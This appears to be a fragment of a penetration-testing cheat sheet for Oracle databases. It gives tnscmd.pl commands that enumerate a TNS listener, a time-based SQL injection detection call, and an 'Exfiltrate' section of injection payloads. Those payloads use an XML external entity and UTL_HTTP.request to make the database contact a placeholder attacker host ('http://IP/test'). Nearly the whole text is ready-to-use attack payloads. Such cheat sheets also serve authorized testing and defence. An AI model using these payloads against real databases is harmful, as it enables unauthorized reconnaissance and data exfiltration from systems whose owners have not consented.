### TNS Listenner
```Shell
tnscmd.pl version -h 10.0.0.1 -p 1521 --indent
tnscmd.pl status -h 10.0.0.1 -p 1521 --indent
tnscmd.pl services -h 10.0.0.1 -p 1521 --indent
```

**Detect

```sql
sys.dbms_session.sleep(1);
```

**Exfiltrate


```SQL
-- Combine multiple lines into one

SELECT dbms_xmlgen.getxmltype('select user from dual') FROM dual

-- XML External Entity

SELECT xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://IP/test"> %remote; %param1;]>') FROM dual;

-- URL_HTTP Request (Pre-11gR2)

SELECT UTL_HTTP.request ('http://IP/test') FROM dual;
```